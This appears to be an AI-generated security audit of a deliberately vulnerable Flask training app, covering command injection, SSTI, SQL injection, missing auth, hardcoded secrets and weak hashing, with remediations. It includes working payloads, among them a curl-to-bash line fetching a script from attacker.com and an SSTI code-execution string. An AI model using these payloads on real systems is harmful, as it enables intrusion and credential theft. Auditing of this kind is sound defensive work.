# Security Investigation Report

**Target:** `./test-app`
**Date:** 2026-05-02
**Agent:** Claude Security Investigator (TypeScript) v1.0
**Files analyzed:** 3 (`app.py`, `requirements.txt`, `README.md`)

---

## Executive Summary

This is a deliberately vulnerable Python/Flask application (136 lines of application code) containing **6 Critical** and **5 High** severity vulnerabilities. An unauthenticated attacker can achieve OS-level remote code execution via a single HTTP request to `/ping`, independently forge valid session cookies using the hardcoded `JWT_SECRET`, and delete every user record in the database — all without possessing any credentials. The codebase must **not** be deployed in any environment; it should be treated purely as a security-training target.

---

## Critical Findings

### [CRITICAL-1] OS Command Injection via `/ping` — Remote Code Execution

**Location:** `app.py:107–109`
**Description:** The `host` query parameter is interpolated directly into a shell command string and executed with `shell=True`. Any character sequence is passed verbatim to `/bin/sh`, giving an unauthenticated caller arbitrary OS-level code execution as the web-server process user.

**Evidence:**
```python
result = subprocess.run(
    f"ping -c 1 {host}", shell=True, capture_output=True, text=True
)
```

**Exploitability:** `GET /ping?host=localhost%3B+curl+https%3A%2F%2Fattacker.com%2Fshell.sh+%7C+bash` runs a remote script on the server. No authentication is required. A single HTTP request gives an attacker a full reverse shell.

**Remediation:** Eliminate `shell=True` entirely. Pass arguments as a list so the OS never invokes a shell interpreter. Validate `host` against a strict allowlist (IP or hostname regex) before use.

```python
import re
if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', host):
    return jsonify({"error": "invalid host"}), 400
result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
```

---

### [CRITICAL-2] Server-Side Template Injection (SSTI) via `/render` — Remote Code Execution

**Location:** `app.py:117–118`
**Description:** User input is concatenated into a Jinja2 template string before rendering. Jinja2 template expressions (`{{ }}`) embedded in the `name` parameter are evaluated by the template engine with full access to Python's object graph, enabling arbitrary code execution.

**Evidence:**
```python
template = "<h1>Hello, " + name + "!</h1>"
return render_template_string(template)
```

**Exploitability:**
```
GET /render?name={{config.items()}}
```
Leaks the entire Flask configuration including `SECRET_KEY`. Full RCE:
```
GET /render?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
```
(The exact subclass index varies by Python version but is trivially enumerable.) No authentication required.

**Remediation:** Never concatenate user data into a template string. Pass user values as named variables so Jinja2 auto-escapes them:
```python
return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```

---

### [CRITICAL-3] SQL Injection in `/login` — Authentication Bypass and Data Exfiltration

**Location:** `app.py:58–64`
**Description:** The `username` field from the JSON body is concatenated directly into a SQL `SELECT` statement. An attacker can inject SQL syntax to bypass the `username + password_hash` check entirely or execute arbitrary queries against the database.

**Evidence:**
```python
query = (
    "SELECT * FROM users WHERE username = '"
    + username
    + "' AND password_hash = '"
    + password_hash
    + "'"
)
row = conn.execute(query).fetchone()
```

**Exploitability:**
```
POST /login
{"username": "admin'--", "password": "anything"}
```
The injected `'--` closes the string and comments out the password check; the query becomes `SELECT * FROM users WHERE username = 'admin'--'`. The admin row is returned and the caller is authenticated. UNION-based payloads can exfiltrate any table in the database.

**Remediation:** Use parameterized queries exclusively:
```python
row = conn.execute(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?",
    (username, password_hash)
).fetchone()
```

---

### [CRITICAL-4] SQL Injection in `/search` — Full Database Dump

**Location:** `app.py:78–80`
**Description:** The `q` GET parameter is concatenated into a `LIKE` clause without escaping or parameterization. A UNION-based payload can pivot the query to return any column from any table, including `password_hash` for all users.

**Evidence:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE '%" + term + "%'"
).fetchall()
```

**Exploitability:**
```
GET /search?q=x%' UNION SELECT password_hash,role FROM users WHERE '1'='1
```
Returns all password hashes and roles for every user. Combined with the MD5 weakness (see HIGH-1), these hashes are trivially cracked.

**Remediation:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE ?",
    (f"%{term}%",)
).fetchall()
```

---

### [CRITICAL-5] Missing Authentication on All `/admin/*` Endpoints

**Location:** `app.py:86–100`
**Description:** Both admin endpoints — listing all users and deleting any user by ID — have no authentication, session check, or authorization guard. Any HTTP client on the network can call them.

**Evidence:**
```python
@app.route("/admin/users")
def admin_list_users():
    conn = get_db()
    rows = conn.execute("SELECT id, username, role FROM users").fetchall()
    ...

@app.route("/admin/delete/<int:user_id>", methods=["POST"])
def admin_delete_user(user_id):
    conn = get_db()
    conn.execute("DELETE FROM users WHERE id = ?", (user_id,))
```

**Exploitability:**
```
GET /admin/users        → full user enumeration, no credentials needed
POST /admin/delete/1   → deletes the admin user, no credentials needed
```

**Remediation:** Implement an `@require_admin` decorator that validates a session token or signed JWT before each request reaches these handlers. Reject unauthenticated requests with HTTP 401; reject non-admin sessions with HTTP 403.

---

### [CRITICAL-6] Hardcoded Secrets Committed to Source Code

**Location:** `app.py:13–15, 20`
**Description:** Three secrets are hardcoded in plaintext: a production API key, a database password, and a JWT secret. The JWT secret is also assigned as Flask's `SECRET_KEY`, which is used to cryptographically sign session cookies. Anyone with the secret can forge a valid session cookie for any user.

**Evidence:**
```python
API_KEY = "sk-prod-7c4e9f2a1b8d3e6f5a9c0d4e8f1b2a7c"
DB_PASSWORD = "admin123"
JWT_SECRET = "supersecret"
...
app.config["SECRET_KEY"] = JWT_SECRET
```

**Exploitability:** `JWT_SECRET = "supersecret"` is trivially guessable and is now in the codebase. An attacker who reads the source (via SSTI, directory traversal, or a leaked repository) can use `flask.sessions` or the `itsdangerous` library to forge a signed cookie claiming to be any user, including admin. The API key and DB password also leak access to external systems.

**Remediation:** Remove all secrets from source. Load from environment variables or a secrets manager:
```python
import os
SECRET_KEY = os.environ["FLASK_SECRET_KEY"]   # fail fast if missing
API_KEY    = os.environ["API_KEY"]
```
Rotate all three exposed credentials immediately. Add a `.gitignore`-backed `.env` file for local development; never commit it.

---

## High Findings

### [HIGH-1] Weak Password Hashing — Unsalted MD5

**Location:** `app.py:54`; seeded hash at `app.py:41`
**Description:** Passwords are hashed with MD5 — a general-purpose hash function that is cryptographically broken for this purpose. MD5 produces no salt, runs millions of iterations per second on consumer hardware, and has extensive precomputed rainbow tables available publicly. The `admin` user's hash (`0192023a7bbd73250516f069df18b500`) is recoverable from any MD5 rainbow table within seconds.

**Evidence:**
```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```
Seeded admin hash:
```python
VALUES ('admin', '0192023a7bbd73250516f069df18b500', 'admin');
```

**Exploitability:** An attacker who obtains hashes via the SQL injection in `/search` (CRITICAL-4) can crack all of them offline with `hashcat -m 0` at billions of attempts per second. The admin password (`admin123`) resolves in milliseconds.

**Remediation:** Use Werkzeug's built-in bcrypt wrapper (already a dependency):
```python
from werkzeug.security import generate_password_hash, check_password_hash
stored = generate_password_hash(password)          # bcrypt, salted
valid  = check_password_hash(stored, password)
```
Migrate existing hashes on next successful login.

---

### [HIGH-2] Permissive CORS — Wildcard Origin with Credentials

**Location:** `app.py:21`
**Description:** CORS is configured to accept requests from every origin while simultaneously allowing credentials. The [CORS specification](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials) explicitly forbids this combination — browsers will refuse the response if they enforce the spec, but the server-side configuration still signals an intent to accept arbitrary cross-origin authenticated requests, and some clients (non-browsers, older browsers, or misconfigured proxies) will honor it.

**Evidence:**
```python
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
```

**Exploitability:** A malicious page on any domain can use `fetch("https://api.target.com/admin/users", {credentials: "include"})` and, in non-strict environments, read the response. Combined with the missing authentication on `/admin/*`, this is a CSRF/cross-origin data-theft vector.

**Remediation:**
```python
CORS(app, resources={r"/api/*": {"origins": ["https://your-frontend.example.com"]}},
     supports_credentials=True)
```
Never combine `origins="*"` with `supports_credentials=True`.

---

### [HIGH-3] Full Stack Traces Returned to HTTP Clients

**Location:** `app.py:121–129`
**Description:** The global error handler serializes `traceback.format_exc()` into the JSON response body. Tracebacks expose internal file paths, library versions, variable names, and SQL error messages — all valuable for reconnaissance.

**Evidence:**
```python
@app.errorhandler(Exception)
def handle_error(e):
    import traceback
    return (
        jsonify({"error": str(e), "trace": traceback.format_exc()}),
        500,
    )
```

**Exploitability:** A deliberately malformed SQL injection payload that causes a parse error will return the full query string (including injected content) in the traceback, confirming the injection point and the DB schema. Attackers routinely use error-based enumeration to extract data.

**Remediation:**
```python
import logging, traceback
logger = logging.getLogger(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    logger.error("Unhandled exception: %s", traceback.format_exc())
    return jsonify({"error": "Internal server error"}), 500
```

---

### [HIGH-4] Flask Debug Mode Enabled

**Location:** `app.py:19, 135`
**Description:** `DEBUG = True` is set both in app config and in the `app.run()` call. Debug mode enables the Werkzeug interactive debugger (PIN-protected but known to be bypassable on some system configurations), hot code reloading, and verbose error pages. Even with the custom error handler overriding HTTP responses, the debug flag affects Flask's internal behavior and runtime exposure surface.

**Evidence:**
```python
app.config["DEBUG"] = True
...
app.run(host="0.0.0.0", port=5000, debug=True)
```

**Exploitability:** If the custom exception handler fails (e.g., during request teardown or template rendering of the error itself), Werkzeug's debugger console can surface. On certain Linux configurations the debugger PIN is derivable from `/proc` filesystem data. Combined with `0.0.0.0` binding, this is network-reachable by any host.

**Remediation:** Never set `DEBUG = True` in production. Gate behind environment:
```python
app.config["DEBUG"] = os.getenv("FLASK_ENV") == "development"
```
Run production deployments behind Gunicorn or uWSGI — both disable the Werkzeug dev server entirely.

---

### [HIGH-5] Significantly Outdated Dependencies

**Location:** `requirements.txt:1–3`
**Description:** The pinned versions (`Flask==2.0.1`, `Werkzeug==2.0.1`) are approximately two major versions behind the current stable release (Flask 3.x, Werkzeug 3.x). Multiple security patches — including fixes for multipart-data denial-of-service, cookie parsing bypasses, and path-handling issues — have been shipped in the intervening releases.

**Evidence:**
```
Flask==2.0.1
flask-cors==3.0.10
Werkzeug==2.0.1
```

**Exploitability:** Werkzeug 2.0.x is affected by CVE-2022-29361 (improper cookie value encoding that can be exploited to bypass cookie-based authentication checks) and CVE-2023-25577 (ReDoS in multipart boundary parsing). An attacker can send a crafted multipart request to degrade the server into a DoS condition or bypass session validation.

**Remediation:** Upgrade to current stable releases and pin with ranges:
```
Flask>=3.0,<4
Werkzeug>=3.0,<4
flask-cors>=4.0,<5
```
Add `pip-audit` or `safety` to the CI pipeline to catch newly disclosed CVEs automatically.

---

## Medium Findings

### [MEDIUM-1] Application Binds to All Network Interfaces (`0.0.0.0`)

**Location:** `app.py:135`
**Description:** The Flask development server listens on `0.0.0.0`, making the application reachable from any network interface — including public-facing adapters in cloud or shared-hosting environments. The development server is not designed to handle production traffic safely.

**Evidence:**
```python
app.run(host="0.0.0.0", port=5000, debug=True)
```

**Exploitability:** In a cloud VM with a public IP, every vulnerability in this report is immediately reachable from the internet without firewall rules specifically blocking port 5000.

**Remediation:** For development, bind to `127.0.0.1`. For production, run behind Gunicorn (`gunicorn -w 4 app:app`) behind an Nginx reverse proxy that terminates TLS; never expose the Flask dev server publicly.

---

### [MEDIUM-2] No Rate Limiting on Authentication Endpoint

**Location:** `app.py:48–70` (absence of limiting middleware)
**Description:** The `/login` endpoint has no rate limiting, account lockout, or CAPTCHA mechanism. Combined with the trivially brute-forceable MD5 password hashing (HIGH-1), an attacker can make unlimited login attempts at the speed of the server's response time.

**Evidence:** `requirements.txt` does not include `flask-limiter` or any equivalent. No `@limiter.limit()` decorator appears on the `/login` route.

**Exploitability:** An attacker with a list of common passwords can brute-force the `/login` endpoint with no throttling. MD5's speed makes offline cracking (after a DB dump) equally trivial.

**Remediation:** Add `flask-limiter`:
```python
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login(): ...
```
Also implement a temporary account lockout after N consecutive failures.

---

## Low Findings

### [LOW-1] Missing HTTP Security Response Headers

**Location:** `app.py` (global — no middleware sets headers)
**Description:** The application returns no security-relevant HTTP headers: no `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Referrer-Policy`. These headers are a defense-in-depth layer against XSS, clickjacking, MIME-sniffing, and downgrade attacks.

**Evidence:** No `after_request` hook or `flask-talisman` / `flask-seasurf` dependency appears anywhere in the codebase.

**Exploitability:** Low in isolation; these headers mitigate browser-side attacks that compound other vulnerabilities (e.g., a reflected XSS made more dangerous by the absence of CSP).

**Remediation:** Add `flask-talisman` (one line) or set headers manually:
```python
from flask_talisman import Talisman
Talisman(app, content_security_policy={"default-src": "'self'"})
```

---

## Vulnerability Chains

### Chain A — Unauthenticated One-Request OS Takeover

**Findings involved:** CRITICAL-1 (Command Injection), MEDIUM-1 (0.0.0.0 binding)

The `/ping` endpoint is unauthenticated and exposed on all interfaces. A single crafted GET request achieves arbitrary OS command execution:

```
GET /ping?host=;curl+https://attacker.com/sh|bash HTTP/1.1
```

From that shell, an attacker can read `app.py` to obtain the hardcoded `API_KEY`, `DB_PASSWORD`, and `JWT_SECRET` (CRITICAL-6), then forge session cookies to impersonate any user. **Severity: CRITICAL — full system compromise in one request.**

---

### Chain B — Full Credential Harvest Without a Login

**Findings involved:** CRITICAL-5 (Missing Auth on /admin), CRITICAL-4 (SQLi in /search), HIGH-1 (Weak MD5)

1. `GET /admin/users` → returns all usernames, IDs, and roles (no auth required).
2. `GET /search?q=x%' UNION SELECT password_hash,role FROM users WHERE '1'='1` → dumps all MD5 hashes.
3. `hashcat -m 0 hashes.txt rockyou.txt` → cracks all hashes in seconds to minutes given MD5's speed and the lack of salting.

Result: plaintext passwords for every account, with no authentication ever attempted against the target app. **Severity: CRITICAL — full credential harvest without credentials.**

---

### Chain C — Session Forgery via SSTI + Hardcoded SECRET_KEY

**Findings involved:** CRITICAL-2 (SSTI), CRITICAL-6 (Hardcoded JWT_SECRET)

Even without the source code, the SSTI in `/render` exposes the running Flask configuration:

```
GET /render?name={{config['SECRET_KEY']}}
→ Response: <h1>Hello, supersecret!</h1>
```

With `SECRET_KEY = "supersecret"` in hand, an attacker uses Python's `itsdangerous` (Flask's session-signing library) to forge a session cookie claiming `{"user": "admin", "role": "admin"}`. Every subsequent request with this forged cookie authenticates as admin — bypassing the login endpoint entirely. **Severity: CRITICAL — authentication completely nullified.**

---

## Positive Observations

- **One parameterized query exists.** The `admin_delete_user` handler at `app.py:98` uses `conn.execute("DELETE FROM users WHERE id = ?", (user_id,))` — demonstrating the developer knows the correct pattern; the SQLi vulnerabilities are divergences from this.
- **Integer type coercion on route parameter.** `<int:user_id>` in `/admin/delete/<int:user_id>` prevents non-integer values from reaching the handler, eliminating one class of input-injection on that path.
- **The application is clearly self-labeled as a test target.** Both the module docstring (`"DO NOT DEPLOY"`) and `README.md` make the intent explicit, reducing accidental deployment risk.
- **Database initialization is idempotent.** `CREATE TABLE IF NOT EXISTS` and `INSERT OR IGNORE` prevent duplicate-seed errors on restart.
- **Werkzeug is already a dependency.** `werkzeug.security.generate_password_hash` / `check_password_hash` (bcrypt-backed) is available without adding any new dependency — the remediation for weak hashing has zero dependency cost.

---

## Recommendations

1. **[Immediate] Take the service offline if running anywhere.** Any of the three RCE paths (CRITICAL-1, CRITICAL-2) or the auth-bypass chain (CRITICAL-3) are exploitable in seconds.

2. **[Day 1] Fix all injection sinks.** Replace string-concatenated SQL with parameterized queries (`?` placeholders) in `/login` and `/search`. Replace `shell=True` subprocess with an argument list and input validation in `/ping`. Pass `name` as a template variable rather than concatenating it in `/render`.

3. **[Day 1] Add authentication to `/admin/*`.** Implement a session-or-JWT authentication decorator; apply it to every `/admin/` route. Add role-based access control (`role == 'admin'`) as a second gate.

4. **[Day 1] Remove hardcoded secrets.** Rotate `API_KEY`, `DB_PASSWORD`, and `JWT_SECRET` immediately. Load all secrets from environment variables or a secrets manager at runtime. Audit git history for past commits containing these values.

5. **[Day 2] Replace MD5 with bcrypt.** Migrate to `werkzeug.security.generate_password_hash` (available at zero extra dependency cost). Invalidate and re-hash existing stored passwords on next login.

6. **[Day 2] Disable debug mode.** Remove `app.config["DEBUG"] = True` and `debug=True` from `app.run()`. Gate on `FLASK_ENV` environment variable. Deploy behind Gunicorn, not the Werkzeug dev server.

7. **[Day 2] Tighten CORS.** Replace `origins="*"` with an explicit list of trusted frontend origins. Verify `supports_credentials=True` is still needed after other auth changes.

8. **[Day 3] Suppress stack traces.** Update the error handler to log tracebacks server-side only; return a generic `{"error": "Internal server error"}` to callers.

9. **[Week 1] Upgrade dependencies.** Pin `Flask>=3.0`, `Werkzeug>=3.0`, and add `pip-audit` to CI to catch future CVEs automatically.

10. **[Week 1] Add `flask-limiter` and security headers.** Rate-limit `/login` (5 req/min per IP), add account lockout logic, and install `flask-talisman` for CSP/HSTS/X-Frame-Options headers.
